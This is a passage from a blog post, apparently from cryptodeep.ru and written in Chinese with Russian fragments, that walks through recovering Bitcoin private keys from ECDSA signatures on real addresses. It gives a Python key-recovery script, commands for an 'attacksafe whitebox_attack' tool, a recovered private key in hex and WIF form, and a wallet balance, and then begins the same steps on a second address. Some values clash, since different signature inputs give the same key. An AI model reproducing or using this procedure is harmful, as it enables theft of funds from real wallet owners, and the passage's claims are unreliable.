<!-- wp:paragraph -->
<p>讓我們打開代碼並添加簽名的所有值<code><strong>K, R, S, Z</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x5d4bc1aa9668f2286151499508869fd31e07f4a9e7dd09f5f6dc4634464dd58d
R = 0x15e3f8b110a2baf09ddcce139644888bda303cd4d0a37c872e5faceb57abff01
S = 0x2d2ca770322bfad7a32ae2568869512f71b8c40a561a7109a54f2799953342e3
Z = 0x793c00bdb7c96e19cb2670f3aec5369558b64f0e12645af070d94c2fc06db6ed


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>該腳本將使用以下公式計算私鑰：</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>讓我們運行腳​​本：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 calculate.py</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1601} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-26.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1601"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>PrivKey = 1835e9d98626da85463bb917cda047b080432863778e97e2d5ffae35d0aefd80</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>讓我們打開<strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress</a></strong>並檢查：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY
WIF:  Kx2mo3Efm5BaC45ozMVM4MPbcY6thbxVwgwXX8ByCuKRZeMmpATx
HEX:  1835e9d98626da85463bb917cda047b080432863778e97e2d5ffae35d0aefd80</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1687} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/001-1.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1687"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>Приватный ключ найден!</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1605,"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-28-1024x461.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1605"/><figcaption class="wp-element-caption"><a href="https://www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY" target="_blank" rel="noreferrer noopener"><strong><code>www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</code></strong></a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>BALANCE: $ 607.79</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>丟失 BTC 硬幣的潛在威脅在於比特幣區塊鏈交易的嚴重漏洞，因此我們強烈建議大家始終更新軟件並僅使用經過驗證的設備。</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://btc1.trezor.io/tx/6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba" target="_blank" rel="noreferrer noopener"><strong>通過詳細的密碼分析，我們還在6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba</strong></a>中發現了一個針對相同比特幣地址的嚴重漏洞<strong><code>&nbsp;TXID:</code></strong><a href="https://btc1.trezor.io/tx/6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>為攻擊準備 RawTX</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY" target="_blank" rel="noreferrer noopener">1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":1609} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-29-1024x135.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1609"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>RawTX = 010000000183635783312a2792b673755da31df935ec22ff9916b4b43b4cefed644cb55a910b0000006b483045022100af4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f2602200a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff014e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>現在我們需要從所有易受攻擊的交易中獲取所有的 R、S、Z 值</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>讓我們使用 breakECDSA.py 腳本</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python2 breakECDSA.py 010000000183635783312a2792b673755da31df935ec22ff9916b4b43b4cefed644cb55a910b0000006b483045022100af4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f2602200a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff014e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1611} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-30-1024x287.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1611"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0xaf4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f26
S = 0x0a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562
Z = 0xf3c7d4c7371a2c57be6b3eb6c446128a3a2cefdb593e6577750c95d22cd8309c</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>要從易受攻擊的 ECDSA 簽名交易中獲取密鑰，讓我們將數據添加<code>RawTX</code>到文本文檔並將其保存為文件<code>RawTX.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>010000000183635783312a2792b673755da31df935ec22ff9916b4b43b4cefed644cb55a910b0000006b483045022100af4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f2602200a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff014e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><code>-tool whitebox_attack</code>使用軟件啟動<code>“ATTACKSAFE SOFTWARE”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -tool whitebox_attack -open RawTX.txt -save SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1613} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-31-1024x359.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1613"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>我們發起了這次攻擊<code>-tool whitebox_attack</code>並將結果保存到一個文件中<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>現在看到成功的結果，打開文件<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1614} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-32-1024x491.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1614"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xf39222231d8ddbaa7425e3c3ff4ebdc86aff1a5449df5910eae18baeb8d5bddd

RawTX = 010000000183635783312a2792b673755da31df935ec22ff9916b4b43b4cefed644cb55a910b0000006b483045022100af4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f2602200a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff014e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>我們看到一個銘文<code>"Deployments ECDSA"</code>，表示比特幣區塊鏈交易中存在嚴重漏洞。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>SecretKey значение в формате HEX, это и есть наш секретный ключ "K" (NONCE):</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0xf39222231d8ddbaa7425e3c3ff4ebdc86aff1a5449df5910eae18baeb8d5bddd</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>讓我們用<em>Python</em>腳本檢查一下<code>point2gen.py</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>讓我們使用ECPy</strong></a>橢圓曲線庫：</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>現在讓我們通過指定運行腳本<code>&nbsp;секретный ключ "K" (NONCE)</code>：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 point2gen.py 0xf39222231d8ddbaa7425e3c3ff4ebdc86aff1a5449df5910eae18baeb8d5bddd</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1616} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-33-1024x92.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1616"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>(0xaf4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f26 , 0x61200da995a31b5be6f875decb954d0e3f8c54d16f7428827a2436cd2fce9419)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>EC (secp256k1)&nbsp;</code>檢查具有簽名值的點的坐標<code>R</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0xaf4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f26
S = 0x0a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562
Z = 0xf3c7d4c7371a2c57be6b3eb6c446128a3a2cefdb593e6577750c95d22cd8309c</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R          =    0xaf4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f26
point2gen  =   (0xaf4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f26 , 0x61200da995a31b5be6f875decb954d0e3f8c54d16f7428827a2436cd2fce9419)
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>ВСЕ ВЕРНО!</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0xf39222231d8ddbaa7425e3c3ff4ebdc86aff1a5449df5910eae18baeb8d5bddd</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>現在知道了密鑰，我們可以得到比特幣錢包的私鑰：<code>1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>讓我們使用&nbsp;<em>Python</em>腳本：&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; 獲取私鑰</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>讓我們打開代碼並添加簽名的所有值<code><strong>K, R, S, Z</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xf39222231d8ddbaa7425e3c3ff4ebdc86aff1a5449df5910eae18baeb8d5bddd
R = 0xaf4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f26
S = 0x0a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562
Z = 0xf3c7d4c7371a2c57be6b3eb6c446128a3a2cefdb593e6577750c95d22cd8309c


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>該腳本將使用以下公式計算私鑰：</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>讓我們運行腳​​本：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 calculate.py</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1618} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-34.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1618"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>PrivKey = 1835e9d98626da85463bb917cda047b080432863778e97e2d5ffae35d0aefd80</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>讓我們打開<strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress</a></strong>並檢查：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY
WIF:  Kx2mo3Efm5BaC45ozMVM4MPbcY6thbxVwgwXX8ByCuKRZeMmpATx
HEX:  1835e9d98626da85463bb917cda047b080432863778e97e2d5ffae35d0aefd80</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1688} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/001-2.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1688"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>Приватный ключ найден!</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1621,"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/001-addr.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1621"/><figcaption class="wp-element-caption"><a href="https://www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY" target="_blank" rel="noreferrer noopener"><strong><code>www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</code></strong></a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>BALANCE: $ 607.79</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><code>№2</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>通過詳細的密碼分析，我們還發現了比特幣地址中的一個嚴重漏洞：</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener">12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/ee10964f25b1888e63726faaf8b8d67779dccebdfdd9b45225fce54d0aa1b80f"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/ee10964f25b1888e63726faaf8b8d67779dccebdfdd9b45225fce54d0aa1b80f
</div></figure>
<!-- /wp:embed -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":1527} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-2-1024x201.png" alt="白盒攻擊" class="wp-image-1527"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":1529} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-3-1024x202.png" alt="白盒攻擊" class="wp-image-1529"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>為攻擊準備 RawTX</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener">12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/ee10964f25b1888e63726faaf8b8d67779dccebdfdd9b45225fce54d0aa1b80f"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/ee10964f25b1888e63726faaf8b8d67779dccebdfdd9b45225fce54d0aa1b80f
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":1624} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-35-1024x144.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1624"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>RawTX = 01000000014398fe319f52d6b4cece666cb591ea22d1ea47dacd5df746e3aa588e5426a43c0d0000006b483045022100dd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc802206a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e4210301210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff0176020000000000001976a914212ae2b75df27ce3dfd0350335bc590d29d43bb188ac00000000
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>現在我們需要從所有易受攻擊的交易中獲取所有的 R、S、Z 值</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>讓我們使用 breakECDSA.py 腳本</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python2 breakECDSA.py 01000000014398fe319f52d6b4cece666cb591ea22d1ea47dacd5df746e3aa588e5426a43c0d0000006b483045022100dd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc802206a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e4210301210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff0176020000000000001976a914212ae2b75df27ce3dfd0350335bc590d29d43bb188ac00000000
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1626} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-36-1024x303.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1626"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0xdd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc8
S = 0x6a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e42103
Z = 0xe3836edb5789a3be19cb8b0c9bc8cb1ae2fd58c30d745ae34ceac35c20c0c21c</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>要從易受攻擊的 ECDSA 簽名交易中獲取密鑰，讓我們將數據添加<code>RawTX</code>到文本文檔並將其保存為文件<code>RawTX.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>01000000014398fe319f52d6b4cece666cb591ea22d1ea47dacd5df746e3aa588e5426a43c0d0000006b483045022100dd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc802206a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e4210301210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff0176020000000000001976a914212ae2b75df27ce3dfd0350335bc590d29d43bb188ac00000000</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><code>-tool whitebox_attack</code>使用軟件啟動<code>“ATTACKSAFE SOFTWARE”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -tool whitebox_attack -open RawTX.txt -save SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1628} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-37-1024x264.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1628"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>我們發起了這次攻擊<code>-tool whitebox_attack</code>並將結果保存到一個文件中<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>現在看到成功的結果，打開文件<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1630} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-38-1024x374.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1630"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x39ec5220d3937da589231cbaa5b04002ce3b5689173680ee110ef81287f7867e

RawTX = 01000000014398fe319f52d6b4cece666cb591ea22d1ea47dacd5df746e3aa588e5426a43c0d0000006b483045022100dd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc802206a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e4210301210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff0176020000000000001976a914212ae2b75df27ce3dfd0350335bc590d29d43bb188ac00000000</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>我們看到一個銘文<code>"Deployments ECDSA"</code>，表示比特幣區塊鏈交易中存在嚴重漏洞。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>SecretKey значение в формате HEX, это и есть наш секретный ключ "K" (NONCE):</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0x39ec5220d3937da589231cbaa5b04002ce3b5689173680ee110ef81287f7867e</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>讓我們用<em>Python</em>腳本檢查一下<code>point2gen.py</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>讓我們使用ECPy</strong></a>橢圓曲線庫：</p>
<!-- /wp:paragraph -->

